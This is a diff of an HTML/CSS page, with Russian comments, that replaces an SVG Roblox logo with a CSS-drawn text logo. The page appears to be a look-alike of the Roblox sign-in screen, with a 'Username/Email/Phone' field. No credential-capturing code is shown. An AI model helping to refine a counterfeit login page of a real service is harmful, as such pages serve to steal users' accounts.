@@ -77,11 +77,37 @@
             z-index: 10;
         }
 
+        /* Идеальный текстовый логотип Roblox */
         .roblox-logo {
-            width: 160px;
-            height: auto;
+            font-size: 38px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            color: #ffffff;
             margin-bottom: 24px;
-            fill: #ffffff;
+            display: flex;
+            align-items: center;
+            gap: 2px;
+            text-transform: uppercase;
+        }
+
+        .roblox-logo .o-square {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px;
+            height: 32px;
+            background-color: #ffffff;
+            transform: rotate(12deg);
+            border-radius: 4px;
+            margin: 0 3px;
+        }
+
+        .roblox-logo .o-square::after {
+            content: "";
+            width: 11px;
+            height: 11px;
+            background-color: #0d0f12;
+            border-radius: 1px;
         }
 
         .input-box {
@@ -211,28 +237,10 @@
     </div>
 
     <div class="container">
-        <!-- Идеальный логотип ROBLOX с наклонным квадратом-о -->
-        <svg class="roblox-logo" viewBox="0 0 700 120" xmlns="http://www.w3.org/2000/svg">
-            <!-- Буква R -->
-            <path d="M10 105V10h52c28 0 45 14.5 45 37.5 0 15.5-8.5 28-23 33.5 17 5 26.5 18.5 26.5 37 0 24-18 47-48 47H10zm48-84c7 0 12-4.2 12-10.7s-5-10.7-12-10.7H33v21.4h25zm3.2 63.5c8 0 13.5-4.5 13.5-12s-5.5-12-13.5-12H33v24h20.2z"/>
-            
-            <!-- Буква O (Наклонный квадрат) -->
-            <g transform="translate(132, 0) rotate(13 55 55)">
-                <path d="M38 0h34c21 0 38 17 38 38v34c0 21-17 38-38 38H38C17 110 0 93 0 72V38C0 17 17 0 38 0zm34 88c8 0 14-6 14-14V36c0-8-6-14-14-14H38c-8 0-14 6-14 14v38c0 8 6 14 14 14h34z"/>
-            </g>
-
-            <!-- Буква B -->
-            <path d="M285 105V10h49c26.5 0 44 14.5 44 37.2 0 14.2-8 25.2-20.5 31 16 4.5 24.5 17.2 24.5 34.2 0 23.8-17.5 42.6-47.5 42.6H285zm47-83c6.8 0 11.2-4 11.2-10.2s-4.4-10.2-11.2-10.2h-15v20.4h15zm3.2 59.8c7.4 0 12.5-4.2 12.5-11.2s-5.1-11.2-12.5-11.2h-18.2v22.4h18.2z"/>
-
-            <!-- Буква L -->
-            <path d="M422 105V10h24v71h48.5v24H422z"/>
-
-            <!-- Буква O -->
-            <path d="M526 108c-25 0-42.5-18.5-42.5-53s17.5-53 42.5-53 42.5 18.5 42.5 53-17.5 53-42.5 53zm0-21c10 0 17-12 17-32s-7-32-17-32-17 12-17 32 7 32 17 32z"/>
-
-            <!-- Буква X -->
-            <path d="M600 105l32.5-49.5L655 105h38l-54.5-76.5L693 10h-37l-29.5 45.5L597 10h-37l52.5 64.5L560 105h40z"/>
-        </svg>
+        <!-- Железобетонный логотип Roblox -->
+        <div class="roblox-logo">
+            R<span class="o-square"></span>BLOX
+        </div>
 
         <div class="input-box">
             <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
